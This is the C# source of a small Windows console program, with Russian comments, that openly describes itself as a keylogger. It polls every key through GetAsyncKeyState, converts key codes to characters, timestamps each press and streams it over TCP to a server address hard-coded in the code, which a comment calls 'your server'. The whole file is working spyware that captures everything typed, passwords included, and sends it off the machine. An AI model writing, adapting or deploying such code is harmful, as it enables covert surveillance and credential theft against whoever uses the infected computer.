using System;
using System.Text;
using System.Net.Sockets;
using System.Runtime.InteropServices;

namespace ConsoleApp15
{
    class Program
    {
        // Импортируем функции Windows API для перехвата клавиш
        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(int vKey);

        // Константы для виртуальных клавиш
        private const int KEY_PRESSED = 0x8000;
        private const int WM_CHAR = 0x0102;

        // Словарь для перевода виртуальных кодов в символы
        private static string GetKeyFromCode(int keyCode)
        {
            // Обработка специальных клавиш
            switch (keyCode)
            {
                case 0x08: return "[BACKSPACE]";
                case 0x09: return "[TAB]";
                case 0x0D: return "[ENTER]";
                case 0x10: return "[SHIFT]";
                case 0x11: return "[CTRL]";
                case 0x12: return "[ALT]";
                case 0x1B: return "[ESC]";
                case 0x20: return "[SPACE]";
                case 0x21: return "[PAGE UP]";
                case 0x22: return "[PAGE DOWN]";
                case 0x23: return "[END]";
                case 0x24: return "[HOME]";
                case 0x25: return "[LEFT]";
                case 0x26: return "[UP]";
                case 0x27: return "[RIGHT]";
                case 0x28: return "[DOWN]";
                case 0x2D: return "[INSERT]";
                case 0x2E: return "[DELETE]";
                case 0x30: return "0";
                case 0x31: return "1";
                case 0x32: return "2";
                case 0x33: return "3";
                case 0x34: return "4";
                case 0x35: return "5";
                case 0x36: return "6";
                case 0x37: return "7";
                case 0x38: return "8";
                case 0x39: return "9";
                case 0x41: return "A";
                case 0x42: return "B";
                case 0x43: return "C";
                case 0x44: return "D";
                case 0x45: return "E";
                case 0x46: return "F";
                case 0x47: return "G";
                case 0x48: return "H";
                case 0x49: return "I";
                case 0x4A: return "J";
                case 0x4B: return "K";
                case 0x4C: return "L";
                case 0x4D: return "M";
                case 0x4E: return "N";
                case 0x4F: return "O";
                case 0x50: return "P";
                case 0x51: return "Q";
                case 0x52: return "R";
                case 0x53: return "S";
                case 0x54: return "T";
                case 0x55: return "U";
                case 0x56: return "V";
                case 0x57: return "W";
                case 0x58: return "X";
                case 0x59: return "Y";
                case 0x5A: return "Z";
                case 0x60: return "0";
                case 0x61: return "1";
                case 0x62: return "2";
                case 0x63: return "3";
                case 0x64: return "4";
                case 0x65: return "5";
                case 0x66: return "6";
                case 0x67: return "7";
                case 0x68: return "8";
                case 0x69: return "9";
                case 0x6A: return "*";
                case 0x6B: return "+";
                case 0x6D: return "-";
                case 0x6E: return ".";
                case 0x6F: return "/";
                case 0xBA: return ";";
                case 0xBB: return "=";
                case 0xBC: return ",";
                case 0xBD: return "-";
                case 0xBE: return ".";
                case 0xBF: return "/";
                case 0xC0: return "`";
                case 0xDB: return "[";
                case 0xDC: return "\\";
                case 0xDD: return "]";
                case 0xDE: return "'";
                default: return $"<{keyCode}>";
            }
        }
        static void Main(string[] args)
        {
            try
            {
                // Подключаемся к серверу
                TcpClient client = new TcpClient();
                client.Connect("192.168.0.208", 5000); // IP твоего сервера
                NetworkStream stream = client.GetStream();

                Console.WriteLine("Кейлоггер запущен. Нажмите любые клавиши...");
                Console.WriteLine("Для выхода закройте окно или нажмите Ctrl+C");

                // Словарь для хранения состояния клавиш (чтобы не отправлять повторно)
                bool[] keyStates = new bool[256];

                // Бесконечный цикл перехвата клавиш
                while (true)
                {
                    System.Threading.Thread.Sleep(50); // Небольшая задержка для снижения нагрузки

                    // Проверяем состояние всех клавиш
                    for (int i = 0; i < 256; i++)
                    {
                        short state = GetAsyncKeyState(i);
                        bool isPressed = (state & KEY_PRESSED) != 0;

                        // Если клавиша была нажата, а раньше была не нажата
                        if (isPressed && !keyStates[i])
                        {
                            keyStates[i] = true;

                            // Получаем символ для этой клавиши
                            string key = GetKeyFromCode(i);

                            // Добавляем временную метку
                            string message = $"{DateTime.Now:HH:mm:ss} - {key}";

                            // Отправляем на сервер
                            byte[] data = Encoding.UTF8.GetBytes(message + "\r\n");
                            stream.Write(data, 0, data.Length);
                            stream.Flush();

                            // Для отладки выводим в консоль
                            Console.WriteLine($"Отправлено: {message}");
                        }
                        // Если клавиша была отпущена
                        else if (!isPressed && keyStates[i])
                        {
                            keyStates[i] = false;
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Ошибка: " + ex.Message);
                Console.ReadKey();
            }
        }
    }
}